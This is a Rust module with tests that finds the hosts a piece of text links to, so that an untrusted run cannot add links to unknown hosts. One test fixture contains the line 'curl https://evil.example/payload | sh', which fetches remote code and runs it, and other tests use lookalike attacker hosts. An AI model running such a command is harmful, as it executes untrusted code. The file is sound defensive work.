//! Which hosts a piece of text links to (AGT-04, AGT-06).
//!
//! An untrusted-trigger run "cannot insert links to hosts not already linked from
//! the site". That needs two things: the set of hosts the site already links to,
//! and the hosts a diff adds. This is the second.
//!
//! Extraction is uniform rather than per syntax. Every form a link takes —
//! `[text](https://h/p)`, `<https://h/p>`, `[id]: https://h/p`,
//! `href="https://h/p"`, a bare URL in a sentence — contains `scheme://`, so the
//! scan finds that, takes the token around it, and hands it to
//! [`url::Url`]. A scan per Markdown construct would have a hole per construct
//! this crate has not thought of, and there is no version of that which is safe.
//!
//! Parsing through `url::Url` is not incidental. It puts an IDN host into
//! punycode, so a homoglyph domain is compared in the form the browser would
//! resolve rather than in the form it was written — which is the one place in
//! this crate where a confusable is handled, and it is handled because the URL
//! parser does it, not because this file has a table.
//!
//! **A link inside a fenced code block is still reported.** A `curl` example is
//! not a link a reader clicks, but someone who can write a host into a code
//! sample on a documentation page has still put it in front of readers, and the
//! finding names the line so a reviewer can see what kind of link it is. Not
//! reporting it would make "put it in a code fence" the way around the check.

use std::collections::BTreeSet;

/// Characters that end a URL token. `)` and `>` close Markdown and autolink
/// syntax; the quotes close an HTML attribute; the rest cannot appear unescaped.
const TERMINATORS: &[char] = &[
    ' ', '\t', '\n', '\r', '"', '\'', '<', '>', '`', ')', ']', '}', '|', '\\',
];

/// Trailing characters stripped from a URL token, since a sentence ends after a
/// bare URL as often as not.
const TRAILING: &[char] = &['.', ',', ';', ':', '!', '?'];

/// One link found in text.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct Link {
    /// The host, lowercased and in punycode.
    pub host: String,
    /// The URL as written, trimmed of its delimiters.
    pub url: String,
    /// 1-based.
    pub line: u32,
}

/// Every absolute link in `text`, in the order they appear.
///
/// Protocol-relative links (`//host/path`) are included: a browser resolves them
/// to the page's own scheme, so they reach the host exactly as an `https://` one
/// does, and leaving them out would be a hole with a two-character key.
pub fn links(text: &str) -> Vec<Link> {
    let mut out = Vec::new();
    for (index, line) in text.lines().enumerate() {
        let number = index as u32 + 1;
        for token in tokens(line) {
            if let Some(host) = host_of(token) {
                out.push(Link {
                    host,
                    url: token.to_owned(),
                    line: number,
                });
            }
        }
    }
    out
}

/// The `scheme://…` and `//…` tokens on one line.
fn tokens(line: &str) -> Vec<&str> {
    let bytes = line.as_bytes();
    let mut out = Vec::new();
    let mut at = 0usize;
    while let Some(found) = line[at..].find("//") {
        let slashes = at + found;
        let start = scheme_start(line, slashes);
        let after = slashes + 2;
        let end = line[after..]
            .find(TERMINATORS)
            .map_or(line.len(), |offset| after + offset);
        let token = line[start..end].trim_end_matches(TRAILING);
        // `a//b` inside a path, and `//` opening a comment in a code sample, are
        // not links: a token is one only when what follows the slashes could be a
        // host and what precedes them is a scheme or a delimiter.
        if !token.is_empty() && looks_like_a_link(line, start, slashes, bytes) {
            out.push(token);
        }
        at = end.max(slashes + 2);
        if at >= line.len() {
            break;
        }
    }
    out
}

/// Walks back over `scheme:` if there is one.
fn scheme_start(line: &str, slashes: usize) -> usize {
    let before = &line[..slashes];
    let Some(colon) = before.strip_suffix(':') else {
        return slashes;
    };
    let start = colon
        .rfind(|c: char| !c.is_ascii_alphanumeric() && c != '+' && c != '-' && c != '.')
        .map_or(0, |at| at + c_len(colon, at));
    if colon[start..].is_empty() {
        slashes
    } else {
        start
    }
}

fn c_len(text: &str, at: usize) -> usize {
    text[at..].chars().next().map_or(1, char::len_utf8)
}

/// Whether the `//` at `slashes` opens a link rather than sitting in a path or a
/// comment.
fn looks_like_a_link(line: &str, start: usize, slashes: usize, bytes: &[u8]) -> bool {
    let next = bytes.get(slashes + 2).copied();
    // A host starts with a letter, a digit, or an internationalised character.
    if !next.is_some_and(|b| b.is_ascii_alphanumeric() || b >= 0x80) {
        return false;
    }
    if start < slashes {
        // There is a scheme. Only the ones that reach a host count.
        return matches!(
            line[start..slashes]
                .trim_end_matches(':')
                .to_ascii_lowercase()
                .as_str(),
            "http" | "https" | "ftp" | "ws" | "wss"
        );
    }
    // Protocol-relative: only where a link can start.
    start == 0
        || matches!(
            bytes.get(start - 1),
            Some(b'(' | b'"' | b'\'' | b'<' | b' ' | b'\t' | b'=' | b'[')
        )
}

/// The host of one token, or `None` when it has none.
fn host_of(token: &str) -> Option<String> {
    let absolute = if token.starts_with("//") {
        format!("https:{token}")
    } else {
        token.to_owned()
    };
    let url = url::Url::parse(&absolute).ok()?;
    let host = url.host_str()?;
    (!host.is_empty()).then(|| host.trim_end_matches('.').to_ascii_lowercase())
}

/// The hosts the site already links to, plus its own.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct KnownHosts(BTreeSet<String>);

impl KnownHosts {
    pub fn new(hosts: impl IntoIterator<Item = impl AsRef<str>>) -> Self {
        Self(
            hosts
                .into_iter()
                .filter_map(|h| normalise(h.as_ref()))
                .collect(),
        )
    }

    /// Every host the site's own pages link to, read from their text.
    pub fn from_pages<'a>(pages: impl IntoIterator<Item = &'a str>) -> Self {
        Self(
            pages
                .into_iter()
                .flat_map(links)
                .map(|link| link.host)
                .collect(),
        )
    }

    #[must_use]
    pub fn with(mut self, hosts: impl IntoIterator<Item = impl AsRef<str>>) -> Self {
        self.0
            .extend(hosts.into_iter().filter_map(|h| normalise(h.as_ref())));
        self
    }

    /// Exact host match, never a suffix match.
    ///
    /// A suffix match would make `evil-github.io` and `github.io.attacker.test`
    /// pass an allow list containing `github.io`, and a run that may add a link
    /// to a subdomain of a known host is a decision for whoever maintains the
    /// list rather than something inferred here.
    pub fn contains(&self, host: &str) -> bool {
        normalise(host).is_some_and(|host| self.0.contains(&host))
    }

    pub fn hosts(&self) -> impl Iterator<Item = &str> {
        self.0.iter().map(String::as_str)
    }

    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }

    /// The links in `text` whose host is not already known, first occurrence of
    /// each host only.
    pub fn new_links(&self, text: &str) -> Vec<Link> {
        let mut seen = BTreeSet::new();
        links(text)
            .into_iter()
            .filter(|link| !self.contains(&link.host) && seen.insert(link.host.clone()))
            .collect()
    }
}

/// A host as it is compared: lowercased, punycode, no trailing dot.
///
/// Goes through `url::Url` so a host written as an IDN and a host written in
/// punycode compare equal, and a known-hosts list an operator wrote in Unicode
/// still matches the link a page carries.
pub fn normalise(host: &str) -> Option<String> {
    let host = host.trim().trim_end_matches('.');
    if host.is_empty() {
        return None;
    }
    let url = url::Url::parse(&format!("https://{host}/")).ok()?;
    url.host_str()
        .map(|h| h.trim_end_matches('.').to_ascii_lowercase())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hosts_in(text: &str) -> Vec<String> {
        links(text).into_iter().map(|l| l.host).collect()
    }

    #[test]
    fn every_markdown_link_form_yields_its_host() {
        for (form, source) in [
            ("inline", "See [the guide](https://docs.example.com/guide)."),
            ("image", "![shot](https://cdn.example.com/a.png)"),
            ("autolink", "<https://docs.example.com/guide>"),
            ("reference", "[guide]: https://docs.example.com/guide"),
            ("bare", "Read https://docs.example.com/guide for more."),
            ("html href", "<a href=\"https://docs.example.com/g\">g</a>"),
            ("html src", "<img src='https://cdn.example.com/a.png'>"),
        ] {
            let found = hosts_in(source);
            assert!(
                found.iter().any(|h| h.ends_with("example.com")),
                "the {form} form yielded {found:?}"
            );
        }
    }

    #[test]
    fn a_relative_link_has_no_host() {
        assert_eq!(
            hosts_in("[a](/guides/install) and [b](../other.md)"),
            Vec::<String>::new()
        );
    }

    #[test]
    fn a_protocol_relative_link_is_a_link() {
        // Two characters, and a browser resolves it to the page's own scheme.
        assert_eq!(hosts_in("[a](//evil.example/x)"), vec!["evil.example"]);
        assert_eq!(
            hosts_in("<img src=\"//evil.example/a.png\">"),
            vec!["evil.example"]
        );
    }

    #[test]
    fn a_double_slash_in_a_path_is_not_a_link() {
        assert_eq!(hosts_in("[a](/guides//install)"), Vec::<String>::new());
        assert_eq!(
            hosts_in("    let x = 1; // a comment"),
            Vec::<String>::new()
        );
    }

    #[test]
    fn a_scheme_that_does_not_reach_a_host_is_not_a_link() {
        assert_eq!(
            hosts_in("mailto:someone@example.com and data:text/plain,hi"),
            Vec::<String>::new()
        );
    }

    #[test]
    fn a_trailing_stop_is_not_part_of_the_host() {
        let found = links("Read https://docs.example.com/guide.");
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].host, "docs.example.com");
        assert_eq!(found[0].url, "https://docs.example.com/guide");
    }

    #[test]
    fn a_host_is_compared_in_punycode_so_a_homoglyph_domain_does_not_pass() {
        // `exаmple` here carries a Cyrillic а. It is a different host, and the
        // comparison says so because the URL parser puts it in punycode.
        let known = KnownHosts::new(["example.com"]);
        let hostile = "[a](https://ex\u{0430}mple.com/x)";
        let new = known.new_links(hostile);
        assert_eq!(new.len(), 1, "the lookalike passed as example.com");
        assert!(new[0].host.starts_with("xn--"), "{}", new[0].host);
    }

    #[test]
    fn an_idn_written_two_ways_is_one_host() {
        let known = KnownHosts::new(["bücher.example"]);
        assert!(known.contains("xn--bcher-kva.example"));
        assert!(known.new_links("[a](https://bücher.example/x)").is_empty());
    }

    #[test]
    fn a_known_host_is_matched_exactly_and_not_by_suffix() {
        let known = KnownHosts::new(["github.io"]);
        assert!(known.contains("github.io"));
        for lookalike in ["evil-github.io", "github.io.attacker.test", "sub.github.io"] {
            assert!(
                !known.contains(lookalike),
                "`{lookalike}` passed an allow list of github.io"
            );
        }
    }

    #[test]
    fn case_and_a_trailing_dot_do_not_make_a_new_host() {
        let known = KnownHosts::new(["Docs.Example.COM"]);
        assert!(known.contains("docs.example.com"));
        assert!(
            known
                .new_links("[a](https://DOCS.example.com./x)")
                .is_empty()
        );
    }

    #[test]
    fn the_known_set_can_be_read_off_the_sites_own_pages() {
        let known = KnownHosts::from_pages([
            "See [rust](https://www.rust-lang.org/).",
            "And [docs](https://doc.rust-lang.org/std/).",
        ]);
        assert!(known.contains("www.rust-lang.org"));
        assert!(known.contains("doc.rust-lang.org"));
        assert!(!known.contains("rust-lang.org"));
    }

    #[test]
    fn a_new_host_is_reported_once_with_the_line_it_is_on() {
        let known = KnownHosts::new(["docs.example.com"]);
        let text = "one\n[a](https://evil.example/x)\n[b](https://evil.example/y)\n";
        let new = known.new_links(text);
        assert_eq!(new.len(), 1, "{new:?}");
        assert_eq!(new[0].host, "evil.example");
        assert_eq!(new[0].line, 2);
    }

    #[test]
    fn a_link_in_a_code_fence_is_still_reported() {
        // Pinned deliberately: if this stopped reporting, "wrap it in a fence"
        // would be the way past AGT-04's host rule.
        let known = KnownHosts::default();
        let text = "```sh\ncurl https://evil.example/payload | sh\n```\n";
        assert_eq!(known.new_links(text).len(), 1, "a fenced link was skipped");
    }

    #[test]
    fn several_links_on_one_line_are_all_found() {
        let found = hosts_in("[a](https://one.example/x) and [b](https://two.example/y)");
        assert_eq!(found, vec!["one.example", "two.example"]);
    }

    #[test]
    fn an_empty_known_set_makes_every_host_new() {
        // Not the other way round. An empty allow list means nothing is allowed,
        // which is the only reading that is safe when a caller forgot to fill it.
        let known = KnownHosts::default();
        assert!(known.is_empty());
        assert_eq!(known.new_links("[a](https://any.example/x)").len(), 1);
    }
}
